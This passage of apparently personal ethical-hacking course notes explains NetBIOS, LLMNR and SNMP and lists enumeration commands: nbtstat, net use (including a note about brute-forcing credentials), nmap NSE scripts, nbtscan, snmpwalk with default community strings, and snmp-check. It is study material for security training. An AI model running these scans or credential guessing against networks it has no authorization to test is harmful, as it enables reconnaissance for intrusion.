id="1e1e60cf-235d-45db-b262-f0a44ba407cc" class="bulleted-list"><li style="list-style-type:disc"><strong>Operation</strong>: Manages connections and sessions for resource sharing.</li></ul><ul id="7619a1de-e1d0-4523-875c-4243c76b8e77" class="bulleted-list"><li style="list-style-type:disc"><strong>Ports</strong>: Operates on TCP port 139.</li></ul></details></li></ul><p id="92180813-7083-4ebc-a1bd-b820dd9f5005" class="">
</p></li></ul><ul id="b2d327cb-31d8-4a3b-8562-b6dc526e4c3a" class="bulleted-list"><li style="list-style-type:disc">NetBIOS enumeration allows attackers to <ul id="3fb0b0b9-0a14-48bb-923b-b8392b5c8ce8" class="bulleted-list"><li style="list-style-type:circle">read or write to a remote computer system (depending on the availability of shares)</li></ul><ul id="c2bab1c3-5b17-43d2-bb44-f31aa5762bc0" class="bulleted-list"><li style="list-style-type:circle">launch a denial of service (DoS) attack.</li></ul></li></ul><p id="e7d33ce1-ad9b-4c9d-9edf-b7d344e788cc" class="">
</p><ul id="53562025-201d-419e-ae51-8ecb0eba1e02" class="toggle"><li><details open=""><summary>NetBIOS Explained</summary><ul id="7e4f772e-778f-49eb-a25c-765e08b61506" class="bulleted-list"><li style="list-style-type:disc">NetBIOS enables the concept of workgroups, allowing computers to be grouped and discovered easily within a local network segment. This simplifies resource sharing and management.</li></ul><ul id="ab3ddcd2-0dcf-497c-8c84-aef4de224b37" class="bulleted-list"><li style="list-style-type:disc">Devices use NetBIOS name resolution to discover other devices and workgroups on the same network segment. This is done through the use of broadcast or multicast messages.</li></ul><ul id="bf69a8cc-5e51-49cc-a6b2-6a4c3f61ec75" class="bulleted-list"><li style="list-style-type:disc">Users can browse the network to find shared resources without needing to know the exact IP addresses.</li></ul><ul id="a9f10339-4ea5-4db0-928a-bb7dfb20b73a" class="bulleted-list"><li style="list-style-type:disc">Modern SMB can operate over DNS, but it traditionally relied on NetBIOS names for resource identification, and it can still use it for compatibility on older systems</li></ul><ul id="92200268-cbd5-4ac2-a678-ae2ce90b8774" class="bulleted-list"><li style="list-style-type:disc">While NetBIOS was essential for file sharing and printing in older Windows versions, modern Windows systems do not require NetBIOS for these functionalities. SMB, operating directly over TCP/IP, provides the necessary capabilities for resource sharing, and NetBIOS can be disabled if not needed for legacy support.</li></ul><ul id="5a9b8f82-9dd8-45e1-a074-8e38117f59e9" class="bulleted-list"><li style="list-style-type:disc">In Windows 11, the default setting for NetBIOS over TCP/IP in network adapter properties is typically set to &quot;Default&quot;. This setting allows the operating system to follow the configuration provided by the DHCP server. If the DHCP server specifies to enable or disable NetBIOS, the system will follow that instruction.</li></ul><ul id="a3aae4bc-4460-4d8c-8734-1a2fa24fff55" class="bulleted-list"><li style="list-style-type:disc">If your DHCP server does not explicitly disable NetBIOS, the system will usually enable it. This is done to maintain backward compatibility</li></ul><ul id="63ee5629-7309-482c-84a7-47bb1734a95f" class="bulleted-list"><li style="list-style-type:disc">Practical use: <ul id="f71d1e36-7c0a-4014-839e-472a9069a075" class="bulleted-list"><li style="list-style-type:circle">Names are easier to remember and use than IP addresses. For instance, accessing <code>\\COMPUTER1\SharedFolder</code> is simpler than remembering <code>\\192.168.1.15\SharedFolder</code>.</li></ul><ul id="24714c0f-0c37-46b5-8376-88fa71fd3b33" class="bulleted-list"><li style="list-style-type:circle">Computers can communicate using IP addresses directly, but this is less user-friendly </li></ul></li></ul><ul id="e103dcf6-a5ac-4578-8f8a-9f344b944a46" class="toggle"><li><details open=""><summary>Workgroups</summary><ul id="089faf4c-46b6-4bee-bff2-110a1c72c848" class="bulleted-list"><li style="list-style-type:disc">Computers within the same workgroup automatically appear in each other’s network neighborhood or network browser, facilitating quicker and more user-friendly access.</li></ul><ul id="e962d357-51be-42ec-b71b-13b22a44cd02" class="bulleted-list"><li style="list-style-type:disc">Workgroups provide a way to logically group computers and resources together, making network organization more intuitive</li></ul><ul id="bae2827a-b30f-40d7-89d8-2ae400fd8f76" class="bulleted-list"><li style="list-style-type:disc">NetBIOS uses broadcast messages to announce the presence of devices and their workgroup memberships. When a computer joins a network, it sends out a broadcast message containing its NetBIOS name and workgroup name.</li></ul><ul id="9c3151c8-992c-4e96-a4f2-2d0672a19ba8" class="bulleted-list"><li style="list-style-type:disc">A device is part of a workgroup if its workgroup name matches that of the other devices in the network.</li></ul><ul id="0e23cbd2-7a21-49d4-af77-14125169256b" class="bulleted-list"><li style="list-style-type:disc">If a device does not have the same workgroup name, it will not be listed as part of that workgroup, although it can still access shared resources if proper permissions are given.</li></ul><ul id="daa340c5-68e3-4bd4-b45d-fc59a56edb5b" class="bulleted-list"><li style="list-style-type:disc">Access Control<ul id="3c51c37f-5c48-4f94-aeed-b3e711d8a5df" class="bulleted-list"><li style="list-style-type:circle">Workgroups do not have a centralized authentication mechanism like domains. Instead, each device manages its own user accounts and permissions.</li></ul><ul id="cf9504e2-595f-4d19-85c4-8f77d17ff44c" class="bulleted-list"><li style="list-style-type:circle">When accessing resources on another device in the workgroup, users typically need to provide a username and password that exist on the target device.</li></ul></li></ul><ul id="fd18a0a6-9d15-48bd-ba92-45400cf23860" class="bulleted-list"><li style="list-style-type:disc">Use cases<ul id="b676d91d-9f63-4fe3-9a15-0e2687b4b073" class="bulleted-list"><li style="list-style-type:circle">Workgroups are ideal for small networks where a domain controller would be overkill.</li></ul><ul id="c296c5ef-d958-432c-b849-11af704c28bd" class="bulleted-list"><li style="list-style-type:circle">They allow for simple file and printer sharing without the need for complex network infrastructure.</li></ul><ul id="575600cd-8e78-41b9-a426-8a286428e054" class="bulleted-list"><li style="list-style-type:circle">This decentralization is suitable for environments where users need to share files and printers without centralized control</li></ul></li></ul></details></li></ul><ul id="7d7615a3-bd5e-49f4-b840-51f19c8fc2de" class="toggle"><li><details open=""><summary>NetBIOS Names</summary><ul id="dc2759f3-d24f-47a0-9e04-2ffb80c1a9e7" class="bulleted-list"><li style="list-style-type:disc">A NetBIOS name comprises a 16-character ASCII string</li></ul><ul id="6aa9d471-bfab-40fb-921f-a70362d33893" class="bulleted-list"><li style="list-style-type:disc">The first 15 characters are used for the device name, and the 16th is reserved for the service or name record type.</li></ul></details></li></ul><ul id="570536b5-e8aa-439c-a2ad-ebc8f03e0918" class="toggle"><li><details open=""><summary>LMNR explained</summary><ul id="08c1c85e-a63e-475a-a4bd-2299ebb8d367" class="bulleted-list"><li style="list-style-type:disc">Its an alternative to DNS and can only be used on local networks</li></ul><ul id="2bd2565d-0537-4db1-be4e-7b9328cad79b" class="bulleted-list"><li style="list-style-type:disc">All modern OSes fall back to this if there is no DNS</li></ul><ul id="25ce7893-59d5-47b3-b06c-8fa6610b55e4" class="bulleted-list"><li style="list-style-type:disc">Operates on 5355 UDP, most nmap scans dont find it because its a high port</li></ul><ul id="e8d0eac9-653d-46ba-89c9-d50aebbf6d2d" class="bulleted-list"><li style="list-style-type:disc">Uses DNS packet format and same record types</li></ul><ul id="25ce5eef-57cc-40f7-b428-5b9586ab1b28" class="bulleted-list"><li style="list-style-type:disc">A query is sent to all devices in a local network</li></ul><ul id="4cb4e5bb-28c8-4396-9570-349092cf1f31" class="bulleted-list"><li style="list-style-type:disc">Only the the device that has the name sends a response</li></ul><ul id="6c188259-b6c3-4206-948d-d78801db8117" class="bulleted-list"><li style="list-style-type:disc">Devices typically announce their names through this when they join a network</li></ul><ul id="f1ba998a-9bfe-41e9-bee8-d4b7fb6a0232" class="bulleted-list"><li style="list-style-type:disc">Can be disabled in the adapter in the same tab as NetBIOS (LMHOSTS)</li></ul></details></li></ul><p id="01d10c97-b88c-4d0f-bec0-ab4a7a5a6241" class="">
</p><ul id="03b3e803-345e-4ffa-a643-ca812e11eed2" class="bulleted-list"><li style="list-style-type:disc">The NetBIOS is simple to exploit and runs on Windows systems even when not in use. </li></ul></details></li></ul><ul id="5e69c1dd-9915-473f-a7fc-4831144d406a" class="toggle"><li><details open=""><summary>Example use and interaction with SMB</summary><p id="5bc66b23-9c20-4d09-80b1-6b85c703941c" class="">While NetBIOS provides the foundational services for name resolution and session management, the actual file and resource sharing are typically handled by the SMB (Server Message Block) protocol. Here’s how these components work together:</p><ol type="1" id="86455e52-1bc2-40f6-aead-2044cc45e596" class="numbered-list" start="1"><li><strong>NetBIOS Name Resolution</strong>:<ul id="d7779a91-ca45-441e-8de7-ba7fce6e987b" class="bulleted-list"><li style="list-style-type:disc">When a user tries to access a resource by name (e.g., <code>\\COMPUTER1\SharedFolder</code>), NetBIOS resolves <code>COMPUTER1</code> to its corresponding IP address using NBNS.</li></ul><ul id="18d51458-f97a-4fe8-936e-b8e9c7efde6b" class="bulleted-list"><li style="list-style-type:disc">This resolution process involves broadcast queries and responses within the local network.</li></ul></li></ol><ol type="1" id="f678f915-f8de-40af-b0a0-a8049f79ae58" class="numbered-list" start="2"><li><strong>Establishing a Session</strong>:<ul id="acf62634-d1f3-4caf-ab05-4fab61e8c61f" class="bulleted-list"><li style="list-style-type:disc">Once the name resolution is complete, the device uses the NetBIOS Session Service (NBSS) to establish a session with the remote device.</li></ul><ul id="4ca88fa8-3797-4982-90b4-01ec65b0c134" class="bulleted-list"><li style="list-style-type:disc">This involves a handshake process over TCP port 139 to create a reliable communication channel.</li></ul></li></ol><ol type="1" id="ce8ed720-3fe6-4f41-aad9-4dcf72d2f080" class="numbered-list" start="3"><li><strong>File and Resource Sharing (SMB)</strong>:<ul id="85159c8e-8d9b-4939-aeaa-870c9752849a" class="bulleted-list"><li style="list-style-type:disc">With the session established, the SMB protocol takes over to handle the actual file and resource sharing operations.</li></ul><ul id="8697b3ae-5460-4356-8b6e-d83f1e16cc13" class="bulleted-list"><li style="list-style-type:disc">SMB provides the commands and responses necessary for accessing shared files, printers, and other resources.</li></ul><ul id="a57c0957-3850-4ef9-8e09-4dc5da4ac4e0" class="bulleted-list"><li style="list-style-type:disc">In modern networks, SMB can also operate directly over TCP/IP (using port 445), bypassing the need for NetBIOS entirely.</li></ul></li></ol></details></li></ul><ul id="38f3adec-b42a-4a66-9b78-8cca7b4c4abc" class="toggle"><li><details open=""><summary>How to disable NetBIOS</summary><ol type="1" id="320d809c-4d48-43b0-bf1d-05f1459450ee" class="numbered-list" start="1"><li>Open Control Panel</li></ol><ol type="1" id="d58c7ad3-951c-4fb6-8ab7-c6ab2e41c9c7" class="numbered-list" start="2"><li>&gt; Network and Sharing Center</li></ol><ol type="1" id="699c6805-3450-4e09-a627-4544fc34a41d" class="numbered-list" start="3"><li>&gt;&gt; Change adapter settings</li></ol><ol type="1" id="21c06517-291c-427f-a9a6-8437f0f61d8d" class="numbered-list" start="4"><li>Right-click the network icon and choose &quot;Properties&quot;</li></ol><ol type="1" id="cdd91f84-d5e3-4fe0-a897-a15d8b097fc8" class="numbered-list" start="5"><li>Double-click &quot;Internet Protocol 4...&quot;</li></ol><ol type="1" id="cb474238-6a43-4b29-b672-57655c2ea4cf" class="numbered-list" start="6"><li>Click &quot;Advanced&quot;</li></ol><ol type="1" id="31623668-0c85-455b-bbab-af631875092e" class="numbered-list" start="7"><li>Select the &quot;WINS&quot; tab</li></ol><ol type="1" id="f319ef37-ec45-4409-9ea3-abd5cb67fd85" class="numbered-list" start="8"><li>Select &quot;Disable NetBIOS over TCP/IP&quot;</li></ol><ol type="1" id="23113f2c-da38-4fb9-aba0-c665149df61a" class="numbered-list" start="9"><li>&#x27;OK&#x27; all of the dialog boxes and reboot your computer.</li></ol></details></li></ul></details></li></ul><p id="a13df894-64f9-4cff-b4fb-e0e1cf730214" class="">
</p><ul id="15b27fd4-0232-4520-998e-87f278dc2954" class="toggle"><li><details open=""><summary>Using Windows Command-Line Utilities</summary><p id="b03a0455-0bee-4010-914f-86a8551566a4" class="">Nbtstat helps in troubleshooting NETBIOS name resolution problems. </p><p id="bf6e43e3-eeee-4b68-9933-34d3b98bef42" class="">The command removes and corrects preloaded entries using several case-sensitive switches.</p><p id="d7de2f88-6774-4243-84dd-5c52713bb37a" class="">
</p><ul id="93f7f5d4-9f57-4fac-9c85-3ba119d30af3" class="bulleted-list"><li style="list-style-type:disc"><code>nbstat -a &lt;target&gt;</code><ul id="e4048d71-772d-4b7c-b95c-c2c92f40a97a" class="bulleted-list"><li style="list-style-type:circle"><code>-a</code>  displays name table for remote computer</li></ul><ul id="3fe69cb4-b276-420e-a917-8241e91b665e" class="bulleted-list"><li style="list-style-type:circle">The table shows the NetBIOS applications running on the remote system and their name</li></ul><ul id="851b777e-2a22-4b80-8073-622b9829a140" class="bulleted-list"><li style="list-style-type:circle">If this works, it means one of these:<ul id="65bd73d6-a526-4e2e-bf76-ff31d8acdf5a" class="bulleted-list"><li style="list-style-type:square">DHCP server does not disable NetBIOS and device has it on default</li></ul><ul id="6f8d4256-b143-45de-9852-d7fc2bf41a26" class="bulleted-list"><li style="list-style-type:square">Device has enabled NetBIOS</li></ul></li></ul></li></ul><ul id="2c0712d1-0711-402e-b4af-8128a9bd8fff" class="bulleted-list"><li style="list-style-type:disc"><code>nbstat -c</code><ul id="2646b37f-e1aa-4673-b34e-59082b7c1481" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> displays the cached table of remote machines</li></ul><ul id="ccae5c2e-f983-4d87-99a1-1705a7989b99" class="bulleted-list"><li style="list-style-type:circle">Its the cache saved in this computer that correlates names with IP addresses</li></ul></li></ul><ul id="318f837a-78e0-4fae-89a4-1e1ee18a07d7" class="bulleted-list"><li style="list-style-type:disc"><code>net use</code><ul id="c15d30b5-2046-44ba-bcbd-d7e372fd1fe2" class="bulleted-list"><li style="list-style-type:circle">displays information about current connections on local machine</li></ul><ul id="0bfa7f07-f882-4532-9c27-ffed0688eca3" class="bulleted-list"><li style="list-style-type:circle">can also be used to connect to a remote share:<ul id="b0cb9a95-0330-423c-8f24-f6346402a757" class="bulleted-list"><li style="list-style-type:square"><code>net use X: \\TargetMachine\ShareName /user:TargetDomain\Username Password</code></li></ul></li></ul><ul id="c1c9bd67-6ca4-4666-be30-631e21a0b200" class="bulleted-list"><li style="list-style-type:circle">For pentesting:<ul id="c5e0e583-c937-4f1b-9fb8-1488809496a5" class="bulleted-list"><li style="list-style-type:square">Connect to shared resources on a local system</li></ul><ul id="ed1ebf76-bfdd-4fae-adaa-b506b580a4da" class="bulleted-list"><li style="list-style-type:square">Test/brute force credentials</li></ul></li></ul></li></ul><p id="4ca260eb-07e6-49f9-90ab-8a11f488d3f4" class="">
</p><p id="9e01aef7-5537-4c1a-bda5-94edb8f6f3a5" class="">
</p><p id="f438e588-f679-4dc7-98db-003414cd85bc" class="">
</p><p id="68f6cabc-b528-4392-aab9-98903203c267" class="">
</p><p id="25b3c057-4123-4e31-8df4-d69b17b13052" class="">
</p><p id="6b3d52d1-dab0-4508-9911-cfff3ca34ed5" class="">
</p></details></li></ul><ul id="850ad731-8902-4cde-9345-85ff9d5f9c03" class="toggle"><li><details open=""><summary>Using NetBIOS Enumerator</summary><p id="875e1099-7437-4ab9-8262-e5d9f1a4ec15" class="">It is used to enumerate details such as NetBIOS names, usernames, domain names, and MAC addresses for a given range of IP addresses.</p><p id="715fe02a-7cdd-444b-8f3c-df3848a4ea95" class="">Windows executable under <code><strong>E:\CEH-Tools\CEHv12 Module 04 Enumeration\NetBIOS Enumeration Tools\NetBIOS Enumerator</strong></code></p><p id="c4766f71-ad36-48b4-9200-15f25447a670" class="">
</p><ul id="8e9ee06c-fc7e-4cf3-b1d8-ad80da45bde1" class="bulleted-list"><li style="list-style-type:disc">Set a range (eg. from 10.10.1.15 to 10.10.1.100)</li></ul><ul id="9f7b9344-ddd6-47ed-aff2-ec9906ed0d7f" class="bulleted-list"><li style="list-style-type:disc">Click <code>Scan</code></li></ul><ul id="e30aa118-f5b9-4072-b74a-7e8902b7bb82" class="bulleted-list"><li style="list-style-type:disc">Explains what services a device has (nbtsat doesnt do that)<figure id="75649e38-8b91-41b0-a175-f4d8fb80b6da" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2090.png"><img style="width:240px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2090.png"/></a></figure></li></ul><ul id="83dadc88-26ca-4a0b-b277-a6b27eff3cc6" class="bulleted-list"><li style="list-style-type:disc">If file services are available, we might enumerate smb shares</li></ul><p id="230957fe-c22c-45dd-859a-ecc6934a453c" class="">
</p></details></li></ul><ul id="7737818c-3eb2-417c-8153-330a59aa4b9a" class="toggle"><li><details open=""><summary>Using NSE script</summary><p id="e6deffd5-7c9c-4b63-9bc1-176037eb7183" class="">This can extract target’s NetBIOS names and MAC addresses. Moreover, increasing verbosity allows you to extract all names related to the system.</p><ul id="a017c355-bb39-4596-9da1-c3f133c3705c" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sV -v --script nbstat.nse &lt;target&gt;</code><ul id="ee484292-ecc1-4e66-b682-9096bae9b06c" class="bulleted-list"><li style="list-style-type:circle"><code>-sV</code> detects service versions</li></ul><ul id="c3ef7a3b-d9df-4805-8a03-5be8b1d566f2" class="bulleted-list"><li style="list-style-type:circle"><code>-v</code> verbose to include all ports and hosts in output</li></ul><ul id="b34713a5-cbce-4862-be31-891840bc4e4c" class="bulleted-list"><li style="list-style-type:circle"><code>--script nbstat.nse</code> script to perform NetBIOS enumeration</li></ul><ul id="a92d2de7-4cf1-419f-874b-841a057f6465" class="bulleted-list"><li style="list-style-type:circle">Shows the same info as before</li></ul></li></ul><ul id="9d2b5b69-0a4c-4a85-8279-72690b541a8a" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sU -p 137 --script nbstat.nse &lt;target&gt;</code><ul id="6b04600e-aa39-4810-a916-73cf0cebf868" class="bulleted-list"><li style="list-style-type:circle"><code>-sU</code> udp scan</li></ul><ul id="4981886e-49ca-4db8-943e-6304413a70e0" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> specifies port</li></ul><ul id="72203119-6d8f-4182-8b7c-d65a5c05fcaf" class="bulleted-list"><li style="list-style-type:circle"><code>--script nbtstat.nse</code> script to perform NetBIOS Enumeration</li></ul><ul id="18d1d8ce-54a8-491e-b7fe-bf1150555a66" class="bulleted-list"><li style="list-style-type:circle">This one enumerates a certain port but shows the same info</li></ul></li></ul><p id="1cc7161f-c8dc-4950-a3ba-907b3136b973" class="">
</p></details></li></ul><ul id="a70d6387-4b1c-43db-ab52-0281f50163b8" class="toggle"><li><details open=""><summary>Using nbtscan</summary><ul id="d5b55772-4c9f-41c7-a32e-b82a8ba91ecb" class="bulleted-list"><li style="list-style-type:disc"><code>nbtscan &lt;target&gt;</code></li></ul></details></li></ul><ul id="6b5d32c7-2266-4b83-a169-db06eb729a59" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="bfea86d4-709a-490d-a072-e433754a69e7" class="bulleted-list"><li style="list-style-type:disc">Global Network Invntory (magnetosoft.com)</li></ul><ul id="27e8135b-a349-4fc8-9cc4-bee2b4562a2f" class="bulleted-list"><li style="list-style-type:disc">Advanced IP Scanner (advanced-ip-scanner.com)</li></ul><ul id="c72e8483-c907-486e-aec1-d40863de1dac" class="bulleted-list"><li style="list-style-type:disc">Hyena (systemtools.com)</li></ul><ul id="ae34742a-0d7b-44da-8372-ecf30d06d405" class="bulleted-list"><li style="list-style-type:disc">Nsauditor (nsauditor.com)</li></ul></details></li></ul></details></li></ul><ul id="a37922f2-0a52-41d7-b662-3f83797bda8f" class="toggle"><li><details open=""><summary>SNMP Enumeration</summary><ul id="3f0a3618-8fa0-4d9c-94a2-0919483fd582" class="toggle"><li><details open=""><summary>Info</summary><p id="1d7aceec-ecf7-4caf-bb9f-8436f0b9e702" class="">SNMP (Simple Network Management Protocol) is an application layer protocol that runs on UDP (User Datagram Protocol) and maintains and manages routers, hubs, and switches on an IP network. SNMP agents run on networking devices on Windows and UNIX networks.</p><p id="6d11f8c9-5c46-433e-9c6a-530044d1b1f0" class="">SNMP employs two types of software components for communication: the SNMP agent and SNMP management station. The SNMP agent is located on the networking device, and the SNMP management station communicates with the agent.</p><ul id="fcc32141-5904-4e50-a920-47a4be56a049" class="toggle"><li><details open=""><summary>SNMP Data Structure</summary><ul id="3dd26913-1fdd-4a6f-b54f-b9513349a827" class="bulleted-list"><li style="list-style-type:disc"><strong>Management Information Base (MIB)</strong>:<ul id="8947639c-bfbe-4393-be9e-291bcf2882a9" class="bulleted-list"><li style="list-style-type:circle"><strong>Definition</strong>: A MIB is a collection of information organized hierarchically. These are used by SNMP to manage entities in a network.</li></ul><ul id="be5eeead-9be3-45f7-8148-09e065e44661" class="bulleted-list"><li style="list-style-type:circle"><strong>Structure</strong>: MIBs are structured as a tree with various levels representing different kinds of information about the network devices. Each node in the MIB tree is an object.</li></ul></li></ul><ul id="ae176a12-1edd-41b4-a0b7-48af29e09d12" class="bulleted-list"><li style="list-style-type:disc"><strong>Object Identifiers (OIDs)</strong>:<ul id="b6b5553a-c49b-4cd8-a87e-d627b6aa5bfd" class="bulleted-list"><li style="list-style-type:circle"><strong>Definition</strong>: An OID uniquely identifies each variable in the MIB hierarchy. OIDs are sequences of numbers, usually represented in a dot-separated format (e.g., <code>1.3.6.1.2.1.1.1.0</code>).</li></ul><ul id="8a50b85a-0d35-4401-920f-6f9932b945ff" class="bulleted-list"><li style="list-style-type:circle"><strong>Purpose</strong>: OIDs are used to reference specific objects in the MIB. Each OID points to a specific parameter or piece of information that can be queried or set via SNMP</li></ul></li></ul><ul id="8e8b0447-4ff7-44f7-9971-26394b88c1f5" class="bulleted-list"><li style="list-style-type:disc">Reason behind this structure<ul id="52cc64de-e9fa-4709-a977-7b16bf228ee1" class="bulleted-list"><li style="list-style-type:circle">MIBs are structured hierarchically to provide a standardized, scalable, and organized way to manage and monitor network devices. </li></ul><ul id="3ea777c7-b185-44f6-9fbb-695a74da7ed5" class="bulleted-list"><li style="list-style-type:circle">This structure allows for efficient data retrieval, clear organization of managed objects, and extensibility for future growth and vendor-specific needs</li></ul></li></ul></details></li></ul><ul id="00ac9916-2bbf-41ad-9cf6-a4972bc84696" class="toggle"><li><details open=""><summary>There is SNMPv1, SNMPv2, and SNMPv3. </summary><ul id="6bdf6d91-5223-42b4-8910-78451b102cc4" class="bulleted-list"><li style="list-style-type:disc">The first two use community strings<ul id="32e36374-2936-4aa2-b9d0-5a4d9dd24835" class="bulleted-list"><li style="list-style-type:circle">these are cleartext passwords and are very insecure b</li></ul><ul id="1d6a752a-b6d2-4ab7-a367-8ab17fa52b47" class="bulleted-list"><li style="list-style-type:circle">They have Read Only and Read Write types of community strings<ul id="849b74ad-f70e-4729-a9c4-fa0acd8920cd" class="bulleted-list"><li style="list-style-type:square">Their default are “public” and “private”</li></ul></li></ul><ul id="c0334d83-d52a-45ad-b6ba-a44a8353017f" class="bulleted-list"><li style="list-style-type:circle">but they have ip specific access list</li></ul></li></ul><ul id="38fccc6b-6d1b-40e8-bffd-ed8e6d05120e" class="bulleted-list"><li style="list-style-type:disc">v3 is the most secure and recommended<ul id="a962c3a2-9f3a-4827-82d8-d38b61177a83" class="bulleted-list"><li style="list-style-type:circle">has accounts and access control security levels</li></ul><ul id="1ae3c6ac-d72f-4c93-9f46-71acc6e99014" class="bulleted-list"><li style="list-style-type:circle">supports MD5 and SHA, DES and AES</li></ul></li></ul></details></li></ul><ul id="52def530-59ee-4828-b343-4cbf58acd20b" class="toggle"><li><details open=""><summary>Ports UDP 161 and UDP 162</summary><ul id="7be37c2e-34f6-4d8a-a8b9-adee5be56f14" class="bulleted-list"><li style="list-style-type:disc"><strong>UDP Port 161</strong>:<ul id="7543581f-df52-498c-91b3-75c141571449" class="bulleted-list"><li style="list-style-type:circle"><strong>Used by Agents</strong>: SNMP agents (running on managed-network devices) listen on UDP port 161 for requests from SNMP managers.</li></ul><ul id="a0e9c973-43e1-46ad-86fe-156b2eaa5390" class="bulleted-list"><li style="list-style-type:circle"><strong>Used by Managers</strong>: SNMP managers send their requests (such as GET, GET-NEXT, GET-BULK, and SET) to the agents on UDP port 161.</li></ul></li></ul><ul id="ef190f37-9753-4c1d-9942-5e6320af8a6f" class="bulleted-list"><li style="list-style-type:disc"><strong>UDP Port 162</strong>:<ul id="e97ccfa9-4698-4ac1-930a-e9c11cf300ba" class="bulleted-list"><li style="list-style-type:circle"><strong>Used by Managers</strong>: SNMP managers-servers listen on UDP port 162 for trap and inform messages from SNMP agents.</li></ul><ul id="911ebdf7-cd72-4513-9cc9-47474ca8cdd9" class="bulleted-list"><li style="list-style-type:circle"><strong>Used by Agents</strong>: SNMP agents send trap or inform messages to SNMP managers on UDP port 162.</li></ul></li></ul><p id="f970df09-21ec-47f3-855f-4adaf1ed6111" class="">Agents produce information and managers receive it to consume it and present it</p></details></li></ul><ul id="d22af50d-0394-4644-b879-06bbb478b131" class="toggle"><li><details open=""><summary>Devices for SNMP Agents and their purpose</summary><ul id="24916211-f401-4256-ba56-980333c97e79" class="bulleted-list"><li style="list-style-type:disc"><strong>Network Devices</strong>:<ul id="aeee200a-b80c-4eb5-aa2b-72c8503225d2" class="bulleted-list"><li style="list-style-type:circle"><strong>Examples</strong>: Routers, switches, firewalls, wireless access points.</li></ul><ul id="9baadb11-83f1-4984-9133-a26caf46142d" class="bulleted-list"><li style="list-style-type:circle"><strong>Functions</strong>: Provide performance data, status information, configuration details, and event notifications.</li></ul></li></ul><ul id="9ccbbf4c-1bdb-4afd-881d-346b663e8a1b" class="bulleted-list"><li style="list-style-type:disc"><strong>Servers and Workstations</strong>:<ul id="08f481c6-850f-43ed-8c11-0407cca7bb69" class="bulleted-list"><li style="list-style-type:circle"><strong>Examples</strong>: Windows servers, Linux servers, UNIX systems, Windows workstations.</li></ul><ul id="6dbc9a3f-0b69-464c-a432-4fba90c77414" class="bulleted-list"><li style="list-style-type:circle"><strong>Functions</strong>: Monitor system performance, resource usage, application status, and send alerts for specific events (e.g., high CPU usage, disk failures).</li></ul></li></ul><ul id="365ee66e-3f22-4067-9a4d-760fa779eb27" class="bulleted-list"><li style="list-style-type:disc"><strong>Printers and Multi-Function Devices</strong>:<ul id="cda59d97-8341-46a4-9c75-deb82bf86595" class="bulleted-list"><li style="list-style-type:circle"><strong>Examples</strong>: Networked printers, scanners, copiers.</li></ul><ul id="80a5f664-c815-4fea-baae-a68f4f4adb7a" class="bulleted-list"><li style="list-style-type:circle"><strong>Functions</strong>: Report status, consumable levels (like toner and paper), and error conditions.</li></ul></li></ul><ul id="45ccdb3b-a214-4c92-b07b-95ff4144bf1f" class="bulleted-list"><li style="list-style-type:disc"><strong>IoT Devices</strong>:<ul id="e54cf8c2-aea9-4e04-a867-0783edddeb15" class="bulleted-list"><li style="list-style-type:circle"><strong>Examples</strong>: Smart sensors, smart meters, environmental monitoring devices.</li></ul><ul id="5cc5a6c9-e780-43c9-9aac-28839ebe36c9" class="bulleted-list"><li style="list-style-type:circle"><strong>Functions</strong>: Provide specific data related to their function (e.g., temperature readings, energy consumption).</li></ul></li></ul></details></li></ul></details></li></ul><ul id="fe40f596-548f-46af-921f-fd7e8a2f2c40" class="toggle"><li><details open=""><summary>Finding open SNMP ports</summary><ul id="b9bf3f2a-6627-4709-95b2-8bc399f21323" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sU -p 161 &lt;target&gt;</code><ul id="62df6fd8-2682-4f23-a953-17fe5b7bc06e" class="bulleted-list"><li style="list-style-type:circle"><code>-sU</code> udp scan</li></ul><ul id="c504fad6-2934-4370-8a96-7ce9834528da" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> define port</li></ul><ul id="0cfdefbd-5982-44a0-bcf5-54d5eac17f95" class="bulleted-list"><li style="list-style-type:circle">port 161 runs on agents (devices that produce information)</li></ul></li></ul></details></li></ul><ul id="0b05fd15-6818-4700-99e1-ca23aa3fb837" class="toggle"><li><details open=""><summary>How to identify SNMP version</summary><p id="433e106e-367b-496f-91ed-fd8d9a9221b3" class="">You send queries that only respond on the speficic version, if it doesnt respond, then it doesnt support that version</p><ul id="6b3d0412-9900-4892-8568-ea6c6e4359e5" class="bulleted-list"><li style="list-style-type:disc">SNMPv1: <code>snmpwalk -v 1 -c public &lt;target-ip&gt; 1.3.6.1.2.1.1.1.0</code></li></ul><ul id="6b38b061-98a8-4a3a-aa6a-e2dbac67adf7" class="bulleted-list"><li style="list-style-type:disc">SNMPv2: <code>snmpwalk -v 2c -c public &lt;target-ip&gt; 1.3.6.1.2.1.1.1.0</code></li></ul><ul id="797cb3fc-e12e-4d0d-841e-c0213c024d52" class="bulleted-list"><li style="list-style-type:disc">SNMPv3: <code>snmpwalk -v 3 -l authNoPriv -u &lt;username&gt; -a MD5 -A &lt;authpass&gt; &lt;target-ip&gt; 1.3.6.1.2.1.1.1.0</code></li></ul><ul id="37439949-0eee-4d0f-ae44-a20cb49ec25c" class="bulleted-list"><li style="list-style-type:disc">The numbers are a basic query command that request a sysDescr object (system description)</li></ul></details></li></ul><ul id="1d919e19-c1be-4361-a2c9-da24f4edc7be" class="toggle"><li><details open=""><summary>Using snmp-check</summary><ul id="c8a1ba2b-b857-47c6-bf2a-69e2236cbad0" class="bulleted-list"><li style="list-style-type:disc"><code>snmp-check &lt;target&gt;</code> <ul id="1a787942-652d-4339-8189-28cee5b95fee" class="bulleted-list"><li style="list-style-type:circle">enumerates the snmp port to extract any info it can find</li></ul><ul id="caaaa681-7367-4a66-8675-fa0879e1da73" class="bulleted-list"><li style="list-style-type:circle">it uses the “public” and “private” comminity strings (these are the default and are like passwords) to get the info</li></ul><ul id="c68d23bd-2574-45ad-8291-fc22678b779a" class="bulleted-list"><li style="list-style-type:circle">If the right community string is used and the ip has access, it can receive:<ul id="43725d78-cd5d-46be-abde-d1bc6552b132" class="bulleted-list"><li style="list-style-type:square">system info, user accounts, network info, 